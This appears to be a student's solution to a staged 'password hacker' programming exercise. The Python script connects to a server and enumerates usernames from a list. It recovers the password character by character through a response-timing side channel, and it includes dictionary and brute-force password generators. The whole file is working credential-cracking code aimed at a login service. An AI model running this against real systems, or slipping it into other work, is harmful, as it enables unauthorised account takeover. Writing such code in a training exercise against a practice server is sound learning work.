# write your code here
import socket
import argparse
import itertools
import string
import json
import time


def main():
    user_input = from_argparser()
    hostname = user_input[0]
    port = user_input[1]
    message = user_input[2]
    login_name_list = stage_4_login_name_json_generator("logins.txt")
    print(stage_4_create_socket(hostname, port, login_name_list))
    # print(create_socket(hostname, port, message))


def stage_4_create_socket(hostname, port, json_string):
    with socket.socket() as s:
        address = (hostname, port)
        s.connect(address)

        login_name = None
        for i in json_string:
            login_trial = {"login": i, "password": " "}
            login_trial = json.dumps(login_trial).encode()
            s.send(login_trial)
            response = s.recv(1024).decode()
            response = json.loads(response)
            if response["result"] != "Wrong login!":
                login_name = i
                break

        correct_password = ""
        password_list = list(string.ascii_letters + string.digits)
        while response["result"] != "Connection success!":
            for pw in password_list:
                trial = json.dumps({"login": login_name, "password": pw})
                trial = trial.encode()
                sending_time = time.time()
                s.send(trial)
                response = json.loads(s.recv(1024))
                response_time = time.time()

                time_lapse = (response_time - sending_time)

                if time_lapse > 0.1:
                    correct_password += pw
                    password_list = [pw + i[-1] for i in password_list]
                    with open("test.txt", "a") as f:
                        f.writelines(f"{pw} is the correct password!\n")
                    break
                if response["result"] == "Connection success!":
                    correct_password = pw
                    with open("test.txt", "a") as f:
                        f.writelines(f"the correct password will be {correct_password}!")
                    break
    return json.dumps({"login": login_name, "password": correct_password})


def create_socket(hostname, port, message):
    with socket.socket() as s:
        address = (hostname, port)
        s.connect(address)

        success_msg = "Connection success!"
        response = ""
        read_password = password_file("passwords.txt")
        final_password_list = stage_3_password_generator(read_password)
        for i in final_password_list:
            try:
                s.send(i.encode())
                response = s.recv(1024).decode()
            except ConnectionAbortedError:
                pass
            if response == success_msg:
                return i


def from_argparser():
    parser = argparse.ArgumentParser(description="To use the program, input IP address, port, message for sending")
    parser.add_argument("ip")
    parser.add_argument("port", type=int)
    parser.add_argument("--message")  # optional argument in stage 2
    args = parser.parse_args()
    return [args.ip, args.port, args.message]


def password_generator(password_length):
    password_list = string.ascii_lowercase + string.digits
    password_set = itertools.product(password_list, repeat=password_length)
    password_set = ["".join(i) for i in password_set]
    return password_set


def stage_3_password_generator(file_requested):
    all_possibility = []
    final_possibility = []
    for i in file_requested:
        possibility_for_a_word = map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in i)))
        all_possibility.append(possibility_for_a_word)
    for i in all_possibility:
        for j in list(i):
            final_possibility.append(j)
    return final_possibility


def stage_4_login_name_json_generator(file_name):
    with open(file_name, "r") as f:
        str = [i.replace("\n", "") for i in f.readlines()]
    return str


def password_file(file_name):
    daily_common_password = []
    with open(file_name, "r") as f:
        for i in f.readlines():
            daily_common_password.append(i)
    daily_common_password = [i.replace("\n", "") for i in daily_common_password]
    return daily_common_password


if __name__ == '__main__':
    main()
